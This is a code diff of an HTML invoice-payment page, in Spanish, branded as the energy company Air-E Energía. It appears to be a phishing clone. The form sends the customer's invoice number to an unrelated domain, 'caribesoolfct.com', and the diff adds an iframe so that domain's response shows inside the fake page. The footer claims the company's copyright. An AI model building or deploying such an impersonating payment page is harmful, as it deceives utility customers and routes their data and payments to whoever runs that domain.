@@ -126,17 +126,19 @@
 </head>
 <body>
 
-  <div class="card" role="main" aria-label="Formulario de pago de factura Air-E Energía">
-    <h1>Pago de Factura Air- E Energía</h1>
-    <p>Ingresa los datos para realizar el pago de tu factura de energía.</p>
+<div class="card" role="main" aria-label="Formulario de pago de factura Air-E Energía">
+  <h1>Pago de Factura Air-E Energía</h1>
+  <p>Ingresa los datos para realizar el pago de tu factura de energía.</p>
 
-    <form action="https://caribesoolfct.com/Pagar?b=eyJlbmNyeXB0ZWQiOnRydWV9" method="POST" novalidate>
-      <label for="cliente">Número de factura</label>
-      <input type="text" id="cliente" name="cliente" placeholder="Ejemplo: 12345678" required />
+  <form action="https://caribesoolfct.com/Pagar?b=eyJlbmNyeXB0ZWQiOnRydWV9" method="POST" target="resultadoPago" novalidate>
+    <label for="cliente">Número de factura</label>
+    <input type="text" id="cliente" name="cliente" placeholder="Ejemplo: 12345678" required />
+    <button type="submit">Pagar Ahora</button>
+  </form>
 
-      <button type="submit">Pagar Ahora</button>
-    </form>
-  </div>
+  <iframe name="resultadoPago" style="width:100%; height:500px; border:none; margin-top:20px;"></iframe>
+</div>
+
 
   <footer>
     &copy; 2025 Air- E Energía. Todos los derechos reservados.
